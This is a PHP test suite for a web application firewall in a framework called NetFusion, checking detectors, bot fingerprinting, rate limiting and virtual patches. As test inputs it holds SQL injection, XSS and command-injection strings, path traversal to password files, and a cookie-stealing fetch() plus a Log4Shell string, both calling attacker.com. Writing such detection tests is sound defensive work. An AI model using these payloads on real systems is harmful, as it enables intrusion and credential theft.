<?php

/**
 * NetFusion Framework - Phase 61 Test Suite
 * Enterprise Web Application Firewall (WAF), Layer 7 DDoS Mitigation, OWASP CRS Inspection, Bot Defense & JA3 TLS Fingerprinting
 */

declare(strict_types=1);

require_once __DIR__ . '/../core/bootstrap.php';

use NetFusion\Core\Application;
use NetFusion\Core\Http\Request;
use NetFusion\Core\Http\Response;
use NetFusion\Core\WAF\Contracts\WAFInterface;
use NetFusion\Core\WAF\Contracts\ThreatDetectorInterface;
use NetFusion\Core\WAF\Contracts\IPReputationInterface;
use NetFusion\Core\WAF\Contracts\WAFStoreInterface;
use NetFusion\Core\WAF\Exceptions\WAFException;
use NetFusion\Core\WAF\Exceptions\SecurityBlockedException;
use NetFusion\Core\WAF\Exceptions\ChallengeRequiredException;
use NetFusion\Core\WAF\Exceptions\ThreatDetectedException;
use NetFusion\Core\WAF\Detectors\AnomalyScore;
use NetFusion\Core\WAF\Detectors\SQLiDetector;
use NetFusion\Core\WAF\Detectors\XSSDetector;
use NetFusion\Core\WAF\Detectors\RCEDetector;
use NetFusion\Core\WAF\Detectors\PathTraversalDetector;
use NetFusion\Core\WAF\Detectors\ProtocolViolationDetector;
use NetFusion\Core\WAF\Bot\JA3Fingerprinter;
use NetFusion\Core\WAF\Bot\BotDetector;
use NetFusion\Core\WAF\Bot\ChallengeEngine;
use NetFusion\Core\WAF\DDoS\AdaptiveRateLimiter;
use NetFusion\Core\WAF\IP\IPReputation;
use NetFusion\Core\WAF\IP\ThreatContext;
use NetFusion\Core\WAF\Rules\WAFRule;
use NetFusion\Core\WAF\Rules\VirtualPatchEngine;
use NetFusion\Core\WAF\Store\ArrayWAFStore;
use NetFusion\Core\WAF\Store\DatabaseWAFStore;
use NetFusion\Core\WAF\Middleware\WAFMiddleware;
use NetFusion\Core\WAF\WAFManager;

$app = new Application(__DIR__ . '/..');

$passed = 0;
$failed = 0;
$total = 0;

function assertTest(string $description, bool $assertion): void
{
    global $passed, $failed, $total;
    $total++;
    if ($assertion) {
        $passed++;
        echo "  [\033[32mPASS\033[0m] {$description}\n";
    } else {
        $failed++;
        echo "  [\033[31mFAIL\033[0m] {$description}\n";
    }
}

echo "\n========================================================================\n";
echo "  NetFusion Framework — Phase 61 Test Suite\n";
echo "  Enterprise Web Application Firewall (WAF) & L7 Security Gateway\n";
echo "========================================================================\n\n";

// -----------------------------------------------------------------------------
// 1. Anomaly Scoring & Thresholds
// -----------------------------------------------------------------------------
echo "1. Testing Anomaly Scoring & Threshold Evaluation...\n";

$anomaly = new AnomalyScore(warningThreshold: 3.0, blockingThreshold: 5.0);
assertTest("Initial anomaly score is 0.0", $anomaly->getScore() === 0.0 && !$anomaly->hasMatches());

$anomaly->addMatch('SQLI_TEST', 'SQLiDetector', 'query.id', 3.5, "' OR 1=1", 'SQL Injection attempt');
assertTest("Anomaly score accumulates points", $anomaly->getScore() === 3.5 && $anomaly->hasMatches());
assertTest("Anomaly score 3.5 triggers warning threshold", $anomaly->isWarning() && !$anomaly->isBlocked());

$anomaly->addMatch('XSS_TEST', 'XSSDetector', 'body.comment', 2.0, '<script>', 'XSS attempt');
assertTest("Anomaly score 5.5 triggers blocking threshold", $anomaly->getScore() === 5.5 && $anomaly->isBlocked());

$anomalySerialized = $anomaly->jsonSerialize();
assertTest("AnomalyScore jsonSerialize() includes score, matches, and flags", $anomalySerialized['is_blocked'] === true && count($anomalySerialized['matches']) === 2);

// -----------------------------------------------------------------------------
// 2. OWASP CRS Threat Detectors
// -----------------------------------------------------------------------------
echo "\n2. Testing OWASP CRS Threat Detectors (SQLi, XSS, RCE, Path Traversal, Protocol)...\n";

$dummyContext = new ThreatContext('192.168.1.10', 'GET', '/search');

// SQLi Detector
$sqliDetector = new SQLiDetector();
$sqliAnomaly1 = new AnomalyScore();
$sqliDetector->inspect('query.id', "1' UNION SELECT null, username, password FROM users--", $dummyContext, $sqliAnomaly1);
assertTest("SQLiDetector detects UNION SELECT injection", $sqliAnomaly1->isBlocked() && count($sqliAnomaly1->getMatches()) >= 1);

$sqliAnomaly2 = new AnomalyScore();
$sqliDetector->inspect('query.user', "admin' OR 1=1#", $dummyContext, $sqliAnomaly2);
assertTest("SQLiDetector detects Boolean-based OR 1=1 injection", $sqliAnomaly2->hasMatches());

$sqliAnomaly3 = new AnomalyScore();
$sqliDetector->inspect('query.q', "test; DROP TABLE orders;", $dummyContext, $sqliAnomaly3);
assertTest("SQLiDetector detects stacked query destructive statement", $sqliAnomaly3->isBlocked());

$sqliAnomaly4 = new AnomalyScore();
$sqliDetector->inspect('query.name', "John Doe", $dummyContext, $sqliAnomaly4);
assertTest("SQLiDetector ignores benign input", !$sqliAnomaly4->hasMatches() && $sqliAnomaly4->getScore() === 0.0);

// XSS Detector
$xssDetector = new XSSDetector();
$xssAnomaly1 = new AnomalyScore();
$xssDetector->inspect('body.comment', '<script>alert(document.cookie)</script>', $dummyContext, $xssAnomaly1);
assertTest("XSSDetector detects <script> tag injection", $xssAnomaly1->isBlocked());

$xssAnomaly2 = new AnomalyScore();
$xssDetector->inspect('query.url', '<img src=x onerror="fetch(\'http://attacker.com/steal?c=\'+document.cookie)">', $dummyContext, $xssAnomaly2);
assertTest("XSSDetector detects inline onerror event handler", $xssAnomaly2->hasMatches());

$xssAnomaly3 = new AnomalyScore();
$xssDetector->inspect('query.href', 'javascript:alert(1)', $dummyContext, $xssAnomaly3);
assertTest("XSSDetector detects javascript: pseudo-protocol", $xssAnomaly3->hasMatches());

$xssAnomaly4 = new AnomalyScore();
$xssDetector->inspect('body.text', 'Hello, this is a clean regular comment!', $dummyContext, $xssAnomaly4);
assertTest("XSSDetector ignores benign text", !$xssAnomaly4->hasMatches());

// RCE Detector
$rceDetector = new RCEDetector();
$rceAnomaly1 = new AnomalyScore();
$rceDetector->inspect('query.cmd', '127.0.0.1; whoami', $dummyContext, $rceAnomaly1);
assertTest("RCEDetector detects command chaining separator (; whoami)", $rceAnomaly1->isBlocked());

$rceAnomaly2 = new AnomalyScore();
$rceDetector->inspect('body.code', 'system("cat /etc/passwd")', $dummyContext, $rceAnomaly2);
assertTest("RCEDetector detects direct PHP system() invocation", $rceAnomaly2->isBlocked());

// Path Traversal Detector
$pathDetector = new PathTraversalDetector();
$pathAnomaly1 = new AnomalyScore();
$pathDetector->inspect('uri', '/download?file=../../../../etc/passwd', $dummyContext, $pathAnomaly1);
assertTest("PathTraversalDetector detects relative directory stepping (../)", $pathAnomaly1->isBlocked());

$pathAnomaly2 = new AnomalyScore();
$pathDetector->inspect('query.path', '..%2f..%2fwin.ini', $dummyContext, $pathAnomaly2);
assertTest("PathTraversalDetector detects URL-encoded traversal and Windows system file", $pathAnomaly2->isBlocked());

$pathAnomaly3 = new AnomalyScore();
$pathDetector->inspect('query.file', "avatar.png\0.php", $dummyContext, $pathAnomaly3);
assertTest("PathTraversalDetector detects null-byte poison injection", $pathAnomaly3->hasMatches());

// Protocol Violation Detector
$protoDetector = new ProtocolViolationDetector();
$protoAnomaly1 = new AnomalyScore();
$badVerbContext = new ThreatContext('192.168.1.10', 'INVALID_METHOD', '/api');
$protoDetector->inspect('method', 'INVALID_METHOD', $badVerbContext, $protoAnomaly1);
assertTest("ProtocolViolationDetector blocks illegal HTTP method", $protoAnomaly1->isBlocked());

$protoAnomaly2 = new AnomalyScore();
$crlfContext = new ThreatContext('192.168.1.10', 'GET', '/');
$protoDetector->inspect('headers.x-test', "clean\r\nSet-Cookie: session=hijacked", $crlfContext, $protoAnomaly2);
assertTest("ProtocolViolationDetector detects CRLF header injection", $protoAnomaly2->isBlocked());

// -----------------------------------------------------------------------------
// 3. Bot Defense & JA3 TLS Fingerprinting
// -----------------------------------------------------------------------------
echo "\n3. Testing Bot Defense & JA3 TLS Fingerprinting...\n";

$ja3 = new JA3Fingerprinter();
$ja3Res = $ja3->compute(
    sslVersion: 771,
    ciphers: [49195, 49199, 49196, 49200],
    extensions: [0, 23, 65281, 10, 11],
    curves: [29, 23, 24],
    pointFormats: [0]
);

assertTest("JA3Fingerprinter computes raw string and 32-char MD5 hash", strlen($ja3Res['hash']) === 32 && str_contains($ja3Res['raw'], '771'));
assertTest("JA3 recognizes sqlmap signature hash", $ja3->isMalicious('bb4f677d7de7091394a45a33c1683d3b'));

$botDetector = new BotDetector($ja3);

// Bad Bot Scanner (Sqlmap)
$sqlmapContext = new ThreatContext('10.0.0.1', 'GET', '/', headers: ['user-agent' => 'sqlmap/1.5.2#stable (http://sqlmap.org)']);
$sqlmapBot = $botDetector->detect($sqlmapContext);
assertTest("BotDetector identifies sqlmap scanner as bad bot", $sqlmapBot['is_bot'] && $sqlmapBot['is_bad_bot'] && $sqlmapBot['bot_type'] === 'security_scanner');

// Headless Browser (Puppeteer)
$puppeteerContext = new ThreatContext('10.0.0.1', 'GET', '/', headers: ['user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/90.0.4430.212 Safari/537.36']);
$puppeteerBot = $botDetector->detect($puppeteerContext);
assertTest("BotDetector identifies HeadlessChrome/Puppeteer as automated browser", $puppeteerBot['is_bot'] && !$puppeteerBot['is_bad_bot'] && $puppeteerBot['bot_type'] === 'headless_browser');

// Legitimate Browser
$legitContext = new ThreatContext('10.0.0.1', 'GET', '/', headers: ['user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36']);
$legitBot = $botDetector->detect($legitContext);
assertTest("BotDetector passes standard browser User-Agent as non-bot", !$legitBot['is_bot']);

// Challenge Engine (Proof-of-Work & JS Cookie)
$challengeEngine = new ChallengeEngine('test-secret-waf-key');
$pow = $challengeEngine->createPoWChallenge(difficulty: 3);

assertTest("ChallengeEngine creates PoW puzzle with seed and signature", isset($pow['seed'], $pow['difficulty'], $pow['signature']));

// Solve PoW puzzle
$nonce = 0;
while (!str_starts_with(hash('sha256', $pow['seed'] . (string)$nonce), '000')) {
    $nonce++;
}

$validPoW = $challengeEngine->verifyPoW($pow['seed'], $pow['difficulty'], $pow['timestamp'], $pow['signature'], $nonce);
assertTest("ChallengeEngine verifies solved Proof-of-Work nonce", $validPoW);

$invalidPoW = $challengeEngine->verifyPoW($pow['seed'], $pow['difficulty'], $pow['timestamp'], $pow['signature'], 999999999);
assertTest("ChallengeEngine rejects invalid Proof-of-Work nonce", !$invalidPoW);

// JS Browser Cookie Token
$cookieToken = $challengeEngine->generateBrowserToken('192.168.1.50', ttl: 3600);
assertTest("ChallengeEngine verifies browser cookie token for same IP", $challengeEngine->verifyBrowserToken($cookieToken, '192.168.1.50'));
assertTest("ChallengeEngine rejects browser cookie token for forged IP", !$challengeEngine->verifyBrowserToken($cookieToken, '10.0.0.99'));

// -----------------------------------------------------------------------------
// 4. Layer 7 DDoS Adaptive Rate Limiting & IP Reputation
// -----------------------------------------------------------------------------
echo "\n4. Testing Layer 7 DDoS Adaptive Rate Limiting & IP Reputation...\n";

$rateLimiter = new AdaptiveRateLimiter(maxRequests: 5, windowSeconds: 10, banThresholdRatio: 2, banDurationSeconds: 60);

for ($i = 0; $i < 5; $i++) {
    $r = $rateLimiter->hit('172.16.0.5');
    assertTest("Hit #{$i} within threshold allowed", $r['allowed']);
}

$throttleHit = $rateLimiter->hit('172.16.0.5');
assertTest("Hit #6 soft throttled (not allowed, delay calculated)", !$throttleHit['allowed'] && !$throttleHit['is_banned']);

// Push to burst ban threshold (5 * 2 = 10 requests)
for ($i = 0; $i < 5; $i++) {
    $rateLimiter->hit('172.16.0.5');
}

assertTest("Burst threshold triggers auto-ban on offending IP", $rateLimiter->isBanned('172.16.0.5'));

// IP Reputation & CIDR Subnet Matching
$ipRep = new IPReputation();
$ipRep->addWhitelist('127.0.0.1', 'Localhost');
$ipRep->addWhitelist('10.0.0.0/8', 'Internal Corporate Network');
$ipRep->addBlacklist('203.0.113.50', 'Known attacker host');
$ipRep->addBlacklist('198.51.100.0/24', 'Malicious Subnet');

assertTest("IPReputation exact IP whitelist check", $ipRep->isWhitelisted('127.0.0.1'));
assertTest("IPReputation CIDR subnet whitelist check (10.50.2.1 inside 10.0.0.0/8)", $ipRep->isWhitelisted('10.50.2.1'));
assertTest("IPReputation exact IP blacklist check", $ipRep->isBlacklisted('203.0.113.50'));
assertTest("IPReputation CIDR subnet blacklist check (198.51.100.44 inside 198.51.100.0/24)", $ipRep->isBlacklisted('198.51.100.44'));
assertTest("IPReputation non-listed IP is neither whitelisted nor blacklisted", !$ipRep->isWhitelisted('8.8.8.8') && !$ipRep->isBlacklisted('8.8.8.8'));

// -----------------------------------------------------------------------------
// 5. Virtual Patching & Declarative Rules Engine
// -----------------------------------------------------------------------------
echo "\n5. Testing Virtual Patching & Declarative Rules Engine...\n";

$patchEngine = new VirtualPatchEngine();

// Zero-day hot-patch rule
$rule1 = $patchEngine->patch(
    id: 'VPATCH-2026-LOG4J',
    field: 'headers.user-agent',
    operator: 'contains',
    pattern: '${jndi:',
    description: 'Log4Shell remote code execution attempt'
);

assertTest("VirtualPatchEngine registers patch rule", $patchEngine->hasRule('VPATCH-2026-LOG4J') && $patchEngine->count() === 1);

$attackContext = new ThreatContext('1.2.3.4', 'GET', '/app', headers: ['user-agent' => '${jndi:ldap://attacker.com/exploit}']);
$matchedPatches = $patchEngine->evaluate($attackContext);

assertTest("VirtualPatchEngine evaluates and matches exploit header", count($matchedPatches) === 1 && $attackContext->isBlocked());
assertTest("ThreatContext records block reason from virtual patch", str_contains((string)$attackContext->getBlockReason(), 'Log4Shell'));

// -----------------------------------------------------------------------------
// 6. Persistence Stores (Array & Database SQLite)
// -----------------------------------------------------------------------------
echo "\n6. Testing WAF Persistence Stores (Array & SQLite Database)...\n";

$arrayStore = new ArrayWAFStore();
$arrayStore->saveIpBlock('1.1.1.1', 'Abusive bot', time() + 3600);
assertTest("ArrayWAFStore stores and checks blocked IP", $arrayStore->isIpBlocked('1.1.1.1'));
$arrayStore->logThreatEvent($attackContext);
assertTest("ArrayWAFStore logs and retrieves recent threat events", count($arrayStore->getRecentThreatEvents()) === 1);

// SQLite Database Store
$sqlitePdo = new PDO('sqlite::memory:');
$sqlitePdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

$migration = require __DIR__ . '/../database/migrations/2026_09_21_000041_create_waf_tables.php';
$migration->up($sqlitePdo);

$dbStore = new DatabaseWAFStore($sqlitePdo);
$dbStore->saveIpBlock('5.5.5.5', 'SQLi Attacker', time() + 1800);
assertTest("DatabaseWAFStore persists IP block to SQLite", $dbStore->isIpBlocked('5.5.5.5'));

$dbStore->logThreatEvent($attackContext);
$recentEvents = $dbStore->getRecentThreatEvents(10);
assertTest("DatabaseWAFStore persists and retrieves threat events", count($recentEvents) === 1 && $recentEvents[0]['ip'] === '1.2.3.4');

$dbStore->recordMetric('inspected', 10);
$dbStore->recordMetric('blocked', 2);
$metrics = $dbStore->getMetrics();
assertTest("DatabaseWAFStore records and aggregates metrics", $metrics['inspected'] === 10 && $metrics['blocked'] === 2);

// -----------------------------------------------------------------------------
// 7. WAFManager End-to-End Inspection Pipeline
// -----------------------------------------------------------------------------
echo "\n7. Testing WAFManager End-to-End Security Inspection Pipeline...\n";

$waf = new WAFManager([
    'thresholds' => ['warning' => 3.0, 'blocking' => 5.0],
    'ip_whitelist' => ['127.0.0.1'],
    'auto_ban' => ['enabled' => true, 'ttl' => 3600],
], $dbStore);

// Test 1: Clean request
$ctx1 = $waf->inspect('192.168.1.100', 'GET', '/products', [], ['category' => 'books'], []);
assertTest("WAFManager ALLOWs clean benign request", $ctx1->isAllowed());

// Test 2: Whitelisted IP with suspicious query
$ctx2 = $waf->inspect('127.0.0.1', 'GET', '/admin', [], ['test' => '<script>alert(1)</script>'], []);
assertTest("WAFManager fast-path ALLOWs whitelisted IP", $ctx2->isAllowed());

// Test 3: SQLi attack from normal IP
$ctx3 = $waf->inspect('198.51.100.77', 'POST', '/login', [], [], ['username' => "admin' OR '1'='1", 'password' => 'pass']);
assertTest("WAFManager BLOCKs SQL Injection attack (403)", $ctx3->isBlocked() && $ctx3->getTriggeredRuleId() !== null);

// Test 4: XSS attack in payload
$ctx4 = $waf->inspect('198.51.100.78', 'POST', '/contact', [], [], ['message' => '<img src=x onerror=alert(1)>']);
assertTest("WAFManager BLOCKs XSS attack payload", $ctx4->isBlocked());

// Test 5: Path Traversal attack in URI
$ctx5 = $waf->inspect('198.51.100.79', 'GET', '/view?page=../../../../etc/shadow');
assertTest("WAFManager BLOCKs Path Traversal attack", $ctx5->isBlocked());

// Test 6: Malicious Bot Scanner
$ctx6 = $waf->inspect('198.51.100.80', 'GET', '/', headers: ['user-agent' => 'sqlmap/1.4.7']);
assertTest("WAFManager BLOCKs malicious vulnerability scanner User-Agent", $ctx6->isBlocked() && $ctx6->getBotType() === 'security_scanner');

// Test 7: Manual IP block
$waf->blockIp('203.0.113.99', 'Spam Bot', 3600);
assertTest("WAFManager isBlocked() returns true for blocked IP", $waf->isBlocked('203.0.113.99'));
$ctx7 = $waf->inspect('203.0.113.99', 'GET', '/');
assertTest("WAFManager immediately BLOCKs blacklisted IP", $ctx7->isBlocked() && $ctx7->getTriggeredRuleId() === 'IP_REPUTATION_BLOCK');

$waf->unblockIp('203.0.113.99');
assertTest("WAFManager unblockIp() restores IP access", !$waf->isBlocked('203.0.113.99'));

// -----------------------------------------------------------------------------
// 8. PSR-15 WAF Middleware & Application Container Integration
// -----------------------------------------------------------------------------
echo "\n8. Testing PSR-15 WAF Middleware & Global Helpers...\n";

// Register bindings in Application container
$app->singleton('waf', function () use ($waf) {
    return $waf;
});

assertTest("Container resolves 'waf' and 'waf.manager'", $app->has('waf'));
assertTest("Global helper waf() returns WAFManager instance", function_exists('waf') && waf() instanceof WAFManager);
assertTest("Global helper waf_check() executes inspection", waf_check('10.0.0.5', 'GET', '/api', ['q' => 'clean'])->isAllowed());
assertTest("Global helper waf_is_blocked() correctly reports IP status", !waf_is_blocked('10.0.0.5'));

// Test Middleware: Clean Request
$middleware = new WAFMiddleware($waf);
$reqClean = Request::create('GET', '/users', ['id' => '42']);
$executedNext = false;
$respClean = $middleware->handle($reqClean, function ($r) use (&$executedNext) {
    $executedNext = true;
    return Response::json(['status' => 'ok']);
});
assertTest("WAFMiddleware passes clean request to next handler", $executedNext && $respClean->getStatusCode() === 200);

// Test Middleware: Attack Request
$reqAttack = Request::create('POST', '/api/search', ['query' => "1' UNION SELECT 1,2,3--"], ['REMOTE_ADDR' => '203.0.113.150']);
$executedAttackNext = false;
$respBlocked = $middleware->handle($reqAttack, function ($r) use (&$executedAttackNext) {
    $executedAttackNext = true;
    return Response::json(['status' => 'should_not_reach']);
});
assertTest("WAFMiddleware intercepts attack and returns 403 Forbidden Response without calling next", !$executedAttackNext && $respBlocked->getStatusCode() === 403);

// -----------------------------------------------------------------------------
// 9. Console Commands Execution
// -----------------------------------------------------------------------------
echo "\n9. Testing WAF CLI Commands...\n";

$kernel = new \NetFusion\Core\Console\Kernel($app);

ob_start();
$exitCode1 = $kernel->call('waf:stats', []);
$output1 = ob_get_clean();
assertTest("CLI command 'waf:stats' executes and prints metrics summary", $exitCode1 === 0 && str_contains($output1, 'Traffic Inspection Summary'));

ob_start();
$exitCode2 = $kernel->call('waf:events', []);
$output2 = ob_get_clean();
assertTest("CLI command 'waf:events' executes and displays recent threat forensics log", $exitCode2 === 0);

ob_start();
$exitCode3 = $kernel->call('waf:block', ['192.0.2.100', 'ttl' => '3600', 'reason' => 'Test admin block']);
$output3 = ob_get_clean();
assertTest("CLI command 'waf:block' blocks specified IP", $exitCode3 === 0 && str_contains($output3, '192.0.2.100'));

ob_start();
$exitCode4 = $kernel->call('waf:unblock', ['192.0.2.100']);
$output4 = ob_get_clean();
assertTest("CLI command 'waf:unblock' unblocks specified IP", $exitCode4 === 0 && str_contains($output4, 'Successfully unblocked'));

// -----------------------------------------------------------------------------
// Summary
// -----------------------------------------------------------------------------
echo "\n========================================================================\n";
echo "  Phase 61 Test Suite Finished: \033[32m{$passed} Passed\033[0m, \033[" . ($failed > 0 ? "31m" : "32m") . "{$failed} Failed\033[0m (Total: {$total})\n";
echo "========================================================================\n\n";

if ($failed > 0) {
    exit(1);
}
exit(0);
